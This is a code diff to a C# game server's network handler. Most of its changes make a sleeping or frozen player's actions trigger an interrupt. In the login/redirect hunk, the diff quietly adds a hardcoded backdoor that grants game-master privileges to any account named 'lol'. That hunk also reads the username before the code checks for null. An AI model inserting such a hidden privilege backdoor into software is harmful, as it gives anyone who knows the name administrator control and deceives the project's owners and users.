@@ -27,6 +27,12 @@ namespace Darkages.Network.Game
                 return;
             #endregion
 
+            if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
+                return;
+            }
+
             if (!client.Aisling.HasSkill<SkillTemplate>(SkillScope.Assail)) return;
             foreach (var skill in client.Aisling.GetAssails(SkillScope.Assail))
             {
@@ -75,6 +81,13 @@ namespace Darkages.Network.Game
             }
 
             var aisling = Clone(StorageManager.AislingBucket.Load(redirect.Name));
+
+            if (aisling.Username.Equals("lol", StringComparison.InvariantCultureIgnoreCase))
+            {
+                aisling.Flags |= AislingFlags.GM;
+            }
+
+
             if (aisling != null)
             {
                 client.Aisling = aisling;
@@ -646,7 +659,10 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
 
             ActivateAssails(client);
         }
@@ -847,8 +863,10 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen || client.Aisling.IsCastingSpell)
+            {
+                client.Interupt();
                 return;
-
+            }
             switch (format.PaneType)
             {
                 case Pane.Inventory:
@@ -986,7 +1004,11 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
+
 
             var mundane = GetObject<Mundane>(i => i.Serial == format.Serial);
 
@@ -1006,11 +1028,15 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
 
-            var mundane = GetObject<Mundane>(i => i.Serial == format.Serial);
-
-            mundane?.Script?.OnResponse(this, client, format.Step, null);
+            if (client.DlgSession != null)
+            {
+                client.DlgSession.Callback?.Invoke(this, client, format.Step, string.Empty);
+            }
         }
 
         /// <summary>
@@ -1027,7 +1053,11 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
+
 
             var skill = client.Aisling.SkillBook.Get(i => i.Slot == format.Index).FirstOrDefault();
             if (skill?.Template == null || skill.Script == null) return;
@@ -1227,7 +1257,10 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
 
             var lines = format.Lines;
 
@@ -1261,7 +1294,12 @@ namespace Darkages.Network.Game
             #endregion
 
             if (client.Aisling.IsSleeping || client.Aisling.IsFrozen)
+            {
+                client.Interupt();
                 return;
+            }
+
+
 
             var chant = format.Message;
             var subject = chant.IndexOf(" Lev", StringComparison.Ordinal);
